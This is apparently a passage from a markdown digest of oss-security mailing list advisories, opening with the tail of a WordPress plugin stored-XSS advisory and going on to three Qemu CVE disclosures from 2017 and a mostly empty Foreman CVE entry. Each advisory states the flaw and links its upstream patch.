	
log=<user name>&pwd=<password>&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/stored_cross_site_scripting_vulnerability_in_user_login_log_wordpress_plugin.html
[2] https://wordpress.org/plugins/user-login-log/
```

</details>

---

</details>

## qemu
<details>
<summary><strong>[oss-security] CVE-2017-6505 Qemu: usb: an infinite loop issue in ohci_service_ed_list</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488824573.20653_1.Morbo,U=39801:2, -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1703062349510.6862@wniryva`

```
   Hello,

Quick Emulator built with the USB OHCI Emulation support is vulnerable to an 
infinite loop issue. It could occur while processing an endpoint list 
descriptor in ohci_service_ed_list().

A guest user/process could use this flaw to crash Qemu process resulting in 
DoS.

Upstream patch:
---------------
   -> http://git.qemu-project.org/?p=qemu.git;a=commitdiff;h=95ed56939eb2eaa4e2f349fe6dcd13ca4edfd8fb

Reference:
----------
   -> https://bugzilla.redhat.com/show_bug.cgi?id=1429432

This issue was reported by Li Qiang of 360.cn Inc.

'CVE-2017-6505' allocated via -> http://cveform.mitre.org/

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>
<details>
<summary><strong>[oss-security] CVE-2017-6414 Qemu: libcacard: host memory leakage while creating new APDU</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488420512.7074_12.Morbo,U=38120:2, -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1703012335480.15645@wniryva`

```
   Hello,

The CAC(Common Access Card) library, used by Quick Emulator(Qemu) to implement 
smartcard support, is vulnerable to a host memory leakage issue. It could 
occur while allocating a new APDU object using guest supplied raw byte stream 
in 'vcard_apdu_new'.

A guest user/process could use this flaw to leak host memory resulting in DoS.

Upstream patch:
---------------
   -> https://cgit.freedesktop.org/spice/libcacard/commit/?id=9113dc6a303604a2d9812ac70c17d076ef11886c

Reference:
----------
   -> https://bugzilla.redhat.com/show_bug.cgi?id=1427833

This issue was reported by Li Qiang of 360.cn Inc.

'CVE-2017-6414' assigned via -> http://cveform.mitre.org/

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>
<details>
<summary><strong>[oss-security] CVE-2017-2633 Qemu: VNC: memory corruption due to unchecked resolution limit</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487850523.12837_1.NdNdNx,U=7658:2,T -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1702230954570.7757@wniryva`

```
   Hello,

Quick Emulator(Qemu) built with the VNC display driver support is vulnerable 
to an out-of-bounds memory access issue. It could occur while refreshing the 
vnc display surface area in 'vnc_refresh_server_surface'.

A user/process inside guest could use this flaw to crash the Qemu process 
resulting in DoS.

Upstream patch:
---------------
   -> http://git.qemu-project.org/?p=qemu.git;a=commitdiff;h=bea60dd7679364493a0d7f5b54316c767cf894ef
   -> http://git.qemu-project.org/?p=qemu.git;a=commitdiff;h=9f64916da20eea67121d544698676295bbb105a7

Older versions of Qemu are affected, latest upstream releases are not.

'CVE-2017-2633' has been assigned to this issue by Red Hat Inc.

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>

## foreman
<details>
<summary><strong>[oss-security] CVE-2016-7078: Foreman organization/location authorization vulnerability</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487817412.10507_78.NdNdNx,U=37335:2,S -->

##### Dominic Cleal <dominic@cleal.org>, `411848dc-8ecb-ed81-1142-c8cce7828cb1@cleal.org`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iFkEARECABkFAliti2oSHGRvbWluaWNAY2xlYWwub3JnAAoJEHx9Mm8sK3LMY68A
nRgoSNyOJnkHBF9BhRi8SsyE1ECRAKCeJ0wtDoAtsPUueRtoGa9Nm3E2KQ==
=aB5+
-----END PGP SIGNATURE-----


```

</details>

---

</details>

